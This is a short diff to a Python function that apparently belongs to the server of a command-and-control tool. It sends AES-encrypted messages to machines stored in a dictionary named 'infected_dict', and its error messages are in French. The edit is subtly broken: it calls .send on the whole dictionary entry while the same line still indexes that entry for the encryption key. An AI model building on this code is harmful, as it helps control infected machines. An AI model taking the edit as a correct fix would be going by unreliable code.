@@ -236,9 +236,9 @@ def send_message(message, infected_dict):
             # expected by the client's receive loop.
             try:
                 encrypted_mess = aes_encrypt(infected_dict[target][2], final_mess)
-                infected_dict[target][0].send(header + encrypted_mess.encode("utf-8"))
+                infected_dict[target].send(header + encrypted_mess.encode("utf-8"))
             except Exception as e:
-                print(f"[!] Erreur d'envoi à {target}")
+                print(f"[!] Erreur d'envoi à {target}\n{e}")
         else:
             # Report an unknown target instead of attempting an invalid lookup.
             print(
